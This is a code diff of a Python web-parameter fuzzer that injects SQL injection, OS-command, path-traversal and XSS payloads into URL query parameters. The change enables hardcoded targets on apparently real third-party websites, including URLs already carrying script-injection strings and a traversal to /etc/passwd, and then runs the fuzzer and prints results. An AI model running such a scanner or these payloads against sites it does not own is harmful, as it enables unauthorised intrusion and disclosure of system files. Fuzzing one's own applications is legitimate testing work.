@@ -64,7 +64,7 @@ class GetFuzzer(iFuzzer):
             for payload in self.payloads:
 
                 fuzzy_url = (self.__replace_param_value(url, query_param, str(payload)))
-                fuzzy_target = FuzzyTarget(fuzzy_url, "get", payload)
+                fuzzy_target = FuzzyTarget(fuzzy_url, "get", payload = payload)
                 fuzzy_targets.append(fuzzy_target)
 
         return fuzzy_targets
@@ -85,9 +85,9 @@ class GetFuzzer(iFuzzer):
     def fuzz(self):
 
         fuzzy_targets = self.generate_fuzzy_targets()
-        self.mreq.get_fuzzy_targets(fuzzy_targets)
+        self.mreq.get_targets(fuzzy_targets)
         results = []
-        for r in self.mreq.targets_results:
+        for r in self.mreq.results:
             ftarget = r[0]
             #print ftarget, r[1][0:100], ftarget.payload.check_type_list
             #!not yet multithreaded, should it be?
@@ -137,19 +137,16 @@ if __name__ == "__main__":
     gf.add_payload(mx_sqli_xmli_trav_osci_payload)
     gf.add_payload(xss_payload)
 
-#    gf.add_target_from_url("http://www.hyperiongray.com/?q=user&t=eke")
-#    gf.add_target_from_url("http://www.sfgcd.com/ProductsBuy.asp?ProNo=%22%3E%3CSCrIpT%3Ealert%2826702%29%3C%2FScRiPt%3E&amp;ProName=%C2%A2%C3%81%C2%A03%083D%09")
-#    gf.add_target_from_url("http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=snippetdetail&amp;ID=1368&amp;Sectionid=%27%29")
-#    gf.add_target_from_url("http://www.dobrevsource.org/index.php?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd")
+    gf.add_target_from_url("http://www.hyperiongray.com/?q=user&t=eke")
+    gf.add_target_from_url("http://www.sfgcd.com/ProductsBuy.asp?ProNo=%22%3E%3CSCrIpT%3Ealert%2826702%29%3C%2FScRiPt%3E&amp;ProName=%C2%A2%C3%81%C2%A03%083D%09")
+    gf.add_target_from_url("http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=snippetdetail&amp;ID=1368&amp;Sectionid=%27%29")
+    gf.add_target_from_url("http://www.dobrevsource.org/index.php?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd")
     gf.add_target_from_url("http://www.dobrevsource.org/")
     gf.add_target_from_url("http://www.wpsurfing.co.za/?feed=%22%3E%3CScRipT%3Ealert%2831337%29%3C%2FScrIpT%3E")
-
-    gf.fuzz()
-
 
 #    for t in gf.generate_fuzzy_targets():
 #        print t.url
 #        print t.payload.check_type_list
 
-#    for res in gf.fuzz():
-#        print res
+    for res in gf.fuzz():
+        print res
